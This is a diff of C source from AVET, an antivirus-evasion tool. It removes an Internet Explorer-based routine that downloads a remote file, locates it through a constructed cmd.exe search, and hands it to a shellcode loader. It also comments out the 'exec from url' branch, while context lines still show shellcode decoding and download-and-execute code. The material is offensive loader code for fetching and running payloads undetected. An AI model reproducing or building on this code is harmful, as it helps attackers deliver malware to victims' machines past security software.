@@ -47,9 +47,6 @@ Web: https://github.com/govolution/avet
 
 
 unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size);
-#ifdef UVALUE
-char* ie_download(char* string, char* sh_filename);
-#endif
 #ifdef DOWNLOADEXECSC
 unsigned char* downloadshellcode(char* uri);
 #endif
@@ -143,8 +140,11 @@ int main (int argc, char **argv)
 	}
 	
 */
+	
+	
+	
 	// exec from url
-#ifdef UVALUE
+/*#ifdef UVALUE
 	else if (uvalue)
 	{
 		#ifdef PRINT_DEBUG
@@ -171,6 +171,7 @@ int main (int argc, char **argv)
 #endif
 	}
 #endif
+*/
 
 #ifdef DOWNLOADEXECSC
 	unsigned char *shellcode = downloadshellcode(argv[1]);
@@ -271,98 +272,3 @@ unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode,
 
 	return shellcode;
 }
-
-#ifdef UVALUE
-// return pointer to the filename
-char* ie_download(char* string, char* sh_filename)
-{
-	char ie[500];
-	GetEnvironmentVariable("PROGRAMFILES",ie,100);
-	strcat(ie,"\\Internet Explorer\\iexplore.exe");
-	ShellExecute(0, "open", ie , string, NULL, SW_SHOWDEFAULT);
-
-	// wait a little until the file is loaded
-	Sleep(8000);
-
-	// get the filename to search format in the ie temp directory
-	char delimiter[] = "/";
-	char *ptr;
-	char *fname;
-	ptr = strtok(string, delimiter);
-	while(ptr != NULL)
-	{
-		fname = ptr;
-		ptr = strtok(NULL, delimiter);
-	}
-
-	#ifdef PRINT_DEBUG
-		printf("ie_download, filename: %s\n", fname);
-	#endif
-
-	// split the filename
-	char delimiter2[] = ".";
-	char *sname;
-	ptr = strtok(fname, delimiter2);
-	sname = ptr;
-	ptr = strtok(NULL, delimiter2);
-
-	#ifdef PRINT_DEBUG
-		printf("ie_download, name to search for: %s\n", sname);
-	#endif
-
-	// search for the file in user profile
-
-	// build searchstring
-	char tmp[150];
-	char tmp_home[150];
-	GetEnvironmentVariable ("USERPROFILE",tmp_home,150);
-	GetEnvironmentVariable ("TEMP",tmp,150);
-	tmp [ strlen(tmp) - 5 ] = 0x0;
-	//printf("\n\n%s\n\n",tmp);
-	char searchstring[500] = "/C ";
-	strncat (searchstring,tmp_home,1);
-	strcat (searchstring,": && cd \"");
-	strcat (searchstring,tmp);
-	strcat (searchstring,"\" && dir . /s /b | find \"");
-	strcat (searchstring,sname);
-	strcat (searchstring,"\" > \"");
-	strcat (searchstring,tmp_home);
-	strcat (searchstring,"\\shellcodefile.txt\"");
-	
-	#ifdef PRINT_DEBUG
-		printf ("ie_download, searchstring: %s\n", searchstring);
-	#endif
-
-	// build & execute cmd
-	char cmd[500];
-	GetEnvironmentVariable ("WINDIR",cmd,500);
-	strcat (cmd,"\\system32\\cmd.exe");
-	ShellExecute (0, "open", "cmd.exe" , searchstring, NULL, SW_SHOWDEFAULT);
-
-	//now read the directory + filename from the textfile
-	char dirfile[500] = {0};
-	strcat (dirfile, tmp_home);
-	strcat (dirfile, "\\shellcodefile.txt");
-	//char *sh_filename;
-	int size_sh_filename=0;
-	int counter = 0;
-	while(size_sh_filename==0 && counter <= 1000)
-	{
-		size_sh_filename = get_filesize (dirfile);
-		Sleep(500);
-		counter++;
-	}
-
-	sh_filename = load_textfile (dirfile, sh_filename, size_sh_filename);
-	// there is always emtpy space at the end of the file -> delete that
-	sh_filename[size_sh_filename-2]=0x0;
-	
-	#ifdef PRINT_DEBUG
-		printf ("ie_download, sh_filename: >>>%s<<<, size: %d\ntest\n", sh_filename, size_sh_filename);
-	#endif
-
-	return sh_filename;
-}
-#endif
-
-
